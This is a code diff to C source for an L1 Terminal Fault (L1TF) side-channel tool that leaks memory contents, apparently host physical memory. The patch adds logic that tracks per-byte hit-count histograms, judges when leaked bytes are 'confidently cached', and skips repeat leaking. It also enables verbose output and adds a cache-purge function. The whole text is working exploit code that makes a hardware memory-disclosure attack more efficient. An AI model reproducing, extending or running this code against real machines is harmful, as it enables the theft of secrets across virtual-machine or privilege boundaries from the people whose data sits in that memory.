@@ -37,6 +37,8 @@
 
 #define THRESHOLD 150
 
+u64 l1tf_cached = 0;
+
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
 
@@ -1029,7 +1031,7 @@ void l1tf_init(void)
   period_start = clock_read();
 }
 
-static void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
+void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
   int i = 0;
   uintptr_t line_end = (pa & ~0x3f) + 0x40;
@@ -1105,16 +1107,67 @@ static void node_print(node_t *node)
   printf("}\n");
 }
 
+int confidently_cached(hpa_t pa, u64 len)
+{
+  // All nodes should be (only zero hits OR exactly one non-zero hit, whose
+  // hitcount >= 4) AND not all data is zero.
+  int non_zero_data = 0;
+  for (unsigned long i = 0; i < len; i++) {
+    node_t *node = hc_map_node(pa + i);
+
+    int nr_non_zero = 0;
+    for (int j = 1; j < 16; j++) {
+      if (!node->low[j])
+        continue;
+      if (node->low[j] < 4)
+        return 0;
+      nr_non_zero++;
+      non_zero_data = 1;
+    }
+    if (nr_non_zero > 1)
+      return 0;
+
+    nr_non_zero = 0;
+    for (int j = 1; j < 16; j++) {
+      if (!node->high[j])
+        continue;
+      if (node->high[j] < 4)
+        return 0;
+      nr_non_zero++;
+      non_zero_data = 1;
+    }
+    if (nr_non_zero > 1)
+      return 0;
+  }
+  return non_zero_data;
+}
+
 void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
-  const int verbose = 0;
+  const int verbose = 1;
   if (verbose) printf("\n");
-  _l1tf_leak(data, base, pa, len);
+
+  if (!confidently_cached(pa, len))
+    _l1tf_leak(data, base, pa, len);
+  else
+    l1tf_cached += len;
+
   for (unsigned long i = 0; i < len; i++) {
     node_t *node = hc_map_node(pa + i);
     node->low[(uint8_t)(data[i] & 0x0f)]++;
     node->high[(uint8_t)(data[i] & 0xf0) >> 4]++;
     data[i] = node_aggregate(node);
     if (verbose) node_print(node);
+  }
+
+  if (confidently_cached(pa, len))
+    printf("condifently cached results already; skipped extra l1tf leaking (CACHED)\n");
+}
+
+void l1tf_purge_cache(hpa_t pa, u64 len)
+{
+  for (unsigned long i = 0; i < len; i++) {
+    node_t *node = hc_map_node(pa + i);
+    memset(&node->low, 0, 2*16*sizeof(hc_t));
   }
 }
